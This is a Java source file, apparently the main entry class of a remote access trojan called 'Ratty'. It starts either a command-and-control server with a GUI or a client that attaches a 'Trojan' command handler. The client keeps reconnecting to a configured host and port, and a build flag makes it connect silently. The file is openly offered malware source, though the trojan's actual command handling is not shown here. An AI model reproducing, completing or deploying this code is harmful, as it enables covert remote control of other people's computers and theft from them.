package de.sogomn.rat;

import java.awt.Color;

import javax.swing.JOptionPane;
import javax.swing.UIDefaults;
import javax.swing.UIManager;
import javax.swing.plaf.nimbus.NimbusLookAndFeel;

import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.gui.RattyGui;
import de.sogomn.rat.server.gui.RattyGuiController;


public final class Ratty {
	
	public static final String ADDRESS = "localhost";
	public static final int PORT = 23456;
	public static final boolean CLIENT = false;
	public static final String VERSION = "1.0";
	
	private Ratty() {
		//...
	}
	
	private static void setLookAndFeel() {
		final NimbusLookAndFeel nimbus = new NimbusLookAndFeel();
		final UIDefaults defaults = nimbus.getDefaults();
		
		defaults.put("control", new Color(245, 245, 245));
		defaults.put("nimbusBase", new Color(225, 225, 225));
		defaults.put("Table:\"Table.cellRenderer\".background", new Color(225, 225, 225));
		defaults.put("Table.alternateRowColor", new Color(175, 175, 175));
		defaults.put("Tree.background", new Color(245, 245, 245));
		
		try {
			UIManager.setLookAndFeel(nimbus);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public static void connectToHost(final String address, final int port) {
		final ActiveClient newClient = new ActiveClient(address, port);
		final Trojan trojan = new Trojan();
		
		if (!newClient.isOpen()) {
			connectToHost(address, port);
			
			return;
		}
		
		newClient.setObserver(trojan);
		newClient.start();
	}
	
	public static void startServer(final int port) {
		final ActiveServer server = new ActiveServer(port);
		final RattyGui gui = new RattyGui();
		final RattyGuiController controller = new RattyGuiController(gui);
		
		server.setObserver(controller);
		server.start();
	}
	
	public static void main(final String[] args) {
		setLookAndFeel();
		
		if (CLIENT) {
			connectToHost(ADDRESS, PORT);
		} else {
			final String[] options = {"Server", "Client"};
			final int input = JOptionPane.showOptionDialog(null, "Server or client?", "Choose", JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, null);
			
			if (input == JOptionPane.YES_OPTION) {
				System.out.println("Starting server");
				
				startServer(PORT);
			} else if (input == JOptionPane.NO_OPTION) {
				System.out.println("Starting client");
				
				connectToHost(ADDRESS, PORT);
			}
		}
	}
	
}
